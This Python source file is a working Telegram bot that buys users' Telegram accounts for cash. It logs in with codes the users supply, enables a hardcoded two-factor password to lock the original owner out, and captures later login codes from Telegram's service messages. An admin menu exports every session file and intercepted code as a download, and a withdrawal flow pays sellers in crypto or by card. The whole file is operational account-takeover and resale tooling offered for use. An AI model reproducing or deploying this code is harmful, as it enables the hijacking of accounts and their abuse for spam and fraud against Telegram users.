import os
import json
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
WITHDRAW_CHANNEL = os.getenv("WITHDRAW_CHANNEL")  # Channel ID

# ========== Settings ==========
TWO_FA_PASSWORD = "Tg@123456"
DEFAULT_PRICE = 0.30
DEFAULT_WAIT_HOURS = 18
MIN_WITHDRAW = 1.00

SESSIONS_DIR = "sessions"
DATA_DIR = "data"
CODES_FILE = os.path.join(DATA_DIR, "codes.json")
ACCOUNTS_FILE = os.path.join(DATA_DIR, "accounts.json")
BALANCES_FILE = os.path.join(DATA_DIR, "balances.json")
PENDING_CLAIMS_FILE = os.path.join(DATA_DIR, "pending_claims.json")

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

WAITING_CODE, WITHDRAW_METHOD, WITHDRAW_DETAILS = range(3)

clients = {}
pending = {}
codes_data = {}

COUNTRY_FLAGS = {
    "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
    "27": "🇿🇦", "234": "🇳🇬", "233": "🇬🇭", "254": "🇰🇪", "255": "🇹🇿",
    "256": "🇺🇬", "20": "🇪🇬", "212": "🇲🇦", "213": "🇩🇿", "216": "🇹🇳",
    "966": "🇸🇦", "971": "🇦🇪", "974": "🇶🇦", "965": "🇰🇼", "968": "🇴🇲",
    "973": "🇧🇭", "90": "🇹🇷", "7": "🇷🇺", "380": "🇺🇦", "49": "🇩🇪",
    "33": "🇫🇷", "39": "🇮🇹", "34": "🇪🇸", "86": "🇨🇳", "81": "🇯🇵",
    "82": "🇰🇷", "66": "🇹🇭", "62": "🇮🇩", "60": "🇲🇾", "65": "🇸🇬",
    "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
}


def get_flag(phone: str) -> str:
    phone = phone.replace("+", "")
    for code in sorted(COUNTRY_FLAGS.keys(), key=len, reverse=True):
        if phone.startswith(code):
            return COUNTRY_FLAGS[code]
    return "🏳️"


def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return default
    return default


def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID


def get_accounts():
    return load_json(ACCOUNTS_FILE, {})


def save_accounts(data):
    save_json(ACCOUNTS_FILE, data)


def get_balances():
    return load_json(BALANCES_FILE, {})


def save_balances(data):
    save_json(BALANCES_FILE, data)


def get_pending_claims():
    return load_json(PENDING_CLAIMS_FILE, {})


def save_pending_claims(data):
    save_json(PENDING_CLAIMS_FILE, data)


def add_balance(user_id: int, amount: float):
    balances = get_balances()
    uid = str(user_id)
    balances[uid] = round(balances.get(uid, 0) + amount, 2)
    save_balances(balances)
    return balances[uid]


def get_user_accounts_count(user_id: int):
    accounts = get_accounts()
    return sum(1 for acc in accounts.values() if acc.get("user_id") == user_id)


# ====================== Telethon ======================

async def start_client(phone: str):
    session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
    client = TelegramClient(session_path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def code_handler(event):
        text = event.message.message or ""
        match = re.search(r'(\d{5,6})', text)
        if match:
            code = match.group(1)
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if phone not in codes_data:
                codes_data[phone] = []
            codes_data[phone].insert(0, {"code": code, "time": now})
            codes_data[phone] = codes_data[phone][:15]
            save_json(CODES_FILE, codes_data)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False


async def enable_2fa(client, password):
    try:
        await client.edit_2fa(new_password=password)
        return True
    except Exception as e:
        print(f"2FA Error: {e}")
        return False


# ====================== User Handlers ======================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"👋 Welcome {user.first_name}!\n\n"
        "Send phone number with country code.\n"
        "Example: `+8801712345678`\n\n"
        "Commands:\n"
        "/balance - Check balance\n"
        "/withdraw - Withdraw money"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bal = get_balances().get(str(user_id), 0)
    await update.message.reply_text(f"💰 Your Balance: **${bal:.2f}**", parse_mode="Markdown")


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    try:
        session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await update.message.reply_text(f"{phone} already logged in!")
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent.phone_code_hash,
            "user_id": user_id
        }

        flag = get_flag(phone)
        await update.message.reply_text(
            f"{flag} Code sent to `{phone}`\n\nSend the code now.\n/cancel to cancel.",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await update.message.reply_text(f"Wait {e.seconds} seconds.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")


async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        return

    code = update.message.text.strip()
    data = pending[chat_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    user_id = data["user_id"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        await update.message.reply_text("Number already has 2FA. Skipped.")
        await client.disconnect()
        del pending[chat_id]
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Wrong code. Try again or /cancel")
        return
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        await client.disconnect()
        del pending[chat_id]
        return

    me = await client.get_me()
    twofa_ok = await enable_2fa(client, TWO_FA_PASSWORD)

    claim_id = f"{user_id}_{phone.replace('+','')}_{int(datetime.now().timestamp())}"
    accounts = get_accounts()
    accounts[phone] = {
        "name": me.first_name or "",
        "id": me.id,
        "user_id": user_id,
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "price": DEFAULT_PRICE,
        "wait_hours": DEFAULT_WAIT_HOURS,
        "twofa": twofa_ok,
        "claim_id": claim_id
    }
    save_accounts(accounts)

    claims = get_pending_claims()
    claims[claim_id] = {
        "user_id": user_id,
        "phone": phone,
        "price": DEFAULT_PRICE,
        "wait_hours": DEFAULT_WAIT_HOURS,
        "added_time": datetime.now().isoformat(),
        "claimed": False
    }
    save_pending_claims(claims)

    await client.disconnect()
    await start_client(phone)
    del pending[chat_id]

    flag = get_flag(phone)
    text = (
        f"✅ **Account Received completed** {flag}\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"• Number: `{phone}`\n"
        f"• Sell price: {DEFAULT_PRICE} USD ✓\n"
        f"• Country’s wait time: {DEFAULT_WAIT_HOURS} hrs ✓\n"
        f"• 2FA: {'Enabled ✅' if twofa_ok else 'Failed'}"
    )
    keyboard = [[InlineKeyboardButton("💰 Claim Balance", callback_data=f"claim_{claim_id}")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def claim_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.data.startswith("claim_"):
        return

    claim_id = query.data.replace("claim_", "")
    claims = get_pending_claims()

    if claim_id not in claims or claims[claim_id]["claimed"]:
        await query.edit_message_text("Already claimed or not found.")
        return

    claim = claims[claim_id]
    if claim["user_id"] != query.from_user.id:
        await query.answer("Not your claim!", show_alert=True)
        return

    added_time = datetime.fromisoformat(claim["added_time"])
    unlock_time = added_time + timedelta(hours=claim["wait_hours"])

    if datetime.now() < unlock_time:
        remaining = unlock_time - datetime.now()
        h = int(remaining.total_seconds() // 3600)
        m = int((remaining.total_seconds() % 3600) // 60)
        await query.answer(f"⏳ Wait {h}h {m}m more", show_alert=True)
        return

    new_bal = add_balance(claim["user_id"], claim["price"])
    claim["claimed"] = True
    claims[claim_id] = claim
    save_pending_claims(claims)

    await query.edit_message_text(
        f"✅ Claimed \( {claim['price']}!\nNew Balance: ** \){new_bal:.2f}**",
        parse_mode="Markdown"
    )


# ====================== Withdraw System ======================

async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bal = get_balances().get(str(user_id), 0)

    if bal < MIN_WITHDRAW:
        await update.message.reply_text(f"❌ Minimum withdraw is ${MIN_WITHDRAW}\nYour balance: ${bal:.2f}")
        return ConversationHandler.END

    keyboard = [
        [InlineKeyboardButton("💳 Leader Card", callback_data="wd_card")],
        [InlineKeyboardButton("🟡 Binance BEP20", callback_data="wd_binance")],
        [InlineKeyboardButton("❌ Cancel", callback_data="wd_cancel")]
    ]
    await update.message.reply_text(
        f"💰 Your Balance: **${bal:.2f}**\n\nSelect withdraw method:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return WITHDRAW_METHOD


async def withdraw_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "wd_cancel":
        await query.edit_message_text("Withdraw cancelled.")
        return ConversationHandler.END

    method = "Leader Card" if query.data == "wd_card" else "Binance BEP20"
    context.user_data["wd_method"] = method

    await query.edit_message_text(
        f"Method: **{method}**\n\nNow send your details:\n"
        f"(Example: Smartmethod or your Binance UID / Address)",
        parse_mode="Markdown"
    )
    return WITHDRAW_DETAILS


async def withdraw_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    details = update.message.text.strip()
    method = context.user_data.get("wd_method", "Unknown")
    bal = get_balances().get(str(user_id), 0)
    acc_count = get_user_accounts_count(user_id)

    # Reset balance after request (optional - you can change later)
    balances = get_balances()
    balances[str(user_id)] = 0
    save_balances(balances)

    now = datetime.now().strftime("%H:%M:%S - %Y/%m/%d")

    post_text = (
        f"💸 **New Withdrawal Request**\n\n"
        f"👤 **User Information**\n"
        f"▫️ Name: {user.first_name}\n"
        f"▫️ User ID: `{user_id}`\n"
        f"▫️ Username: @{user.username or 'None'}\n\n"
        f"📊 **Account Summary**\n"
        f"▫️ Total Accounts: {acc_count}\n"
        f"💵 Balance: ${bal:.2f}\n\n"
        f"🔄 **Withdrawal Details**\n"
        f"▫️ Method: {method}\n"
        f"▫️ Details: {details}\n"
        f"⏰ Time: {now}"
    )

    # Send to channel
    try:
        if WITHDRAW_CHANNEL:
            await context.bot.send_message(
                chat_id=int(WITHDRAW_CHANNEL),
                text=post_text,
                parse_mode="Markdown"
            )
    except Exception as e:
        print(f"Channel post error: {e}")

    await update.message.reply_text(
        "✅ Withdrawal request submitted!\n"
        "Please wait for admin to process."
    )
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END


# ====================== Admin ======================

async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = get_accounts()
    total_bal = sum(get_balances().values())

    text = (
        f"📊 **Admin Dashboard**\n\n"
        f"Total Accounts: **{len(accounts)}**\n"
        f"Online: **{len(clients)}**\n"
        f"Total User Balance: **${total_bal:.2f}**\n"
        f"2FA: `{TWO_FA_PASSWORD}`"
    )
    keyboard = [
        [
            InlineKeyboardButton("📥 Codes", callback_data="dl_codes"),
            InlineKeyboardButton("📁 Sessions", callback_data="dl_sessions")
        ],
        [InlineKeyboardButton("📋 Accounts", callback_data="list_acc")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        return

    if query.data == "dl_codes":
        path = os.path.join(DATA_DIR, "codes.json")
        save_json(path, load_json(CODES_FILE, {}))
        await query.message.reply_document(open(path, "rb"), filename="codes.json")
    elif query.data == "dl_sessions":
        import zipfile
        zip_path = os.path.join(DATA_DIR, "sessions.zip")
        with zipfile.ZipFile(zip_path, "w") as z:
            for f in os.listdir(SESSIONS_DIR):
                if f.endswith(".session"):
                    z.write(os.path.join(SESSIONS_DIR, f), f)
        await query.message.reply_document(open(zip_path, "rb"), filename="sessions.zip")
    elif query.data == "list_acc":
        accounts = get_accounts()
        text = f"Total: {len(accounts)}\n\n"
        for i, phone in enumerate(list(accounts.keys())[:30], 1):
            text += f"{i}. `{phone}`\n"
        await query.edit_message_text(text, parse_mode="Markdown")


async def post_init(app: Application):
    print("Loading sessions...")
    for phone in get_accounts():
        try:
            await start_client(phone)
        except:
            pass
    print("Ready!")


def main():
    global codes_data
    codes_data = load_json(CODES_FILE, {})

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Login conversation
    login_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.TEXT & \~filters.COMMAND, handle_phone)],
        states={WAITING_CODE: [MessageHandler(filters.TEXT & \~filters.COMMAND, handle_code)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Withdraw conversation
    withdraw_conv = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw_start)],
        states={
            WITHDRAW_METHOD: [CallbackQueryHandler(withdraw_method)],
            WITHDRAW_DETAILS: [MessageHandler(filters.TEXT & \~filters.COMMAND, withdraw_details)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("balance", balance_cmd))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(login_conv)
    app.add_handler(withdraw_conv)
    app.add_handler(CallbackQueryHandler(claim_handler, pattern=r"^claim_"))
    app.add_handler(CallbackQueryHandler(admin_buttons))

    print("Bot running...")
    app.run_polling()


if __name__ == "__main__":
    main()
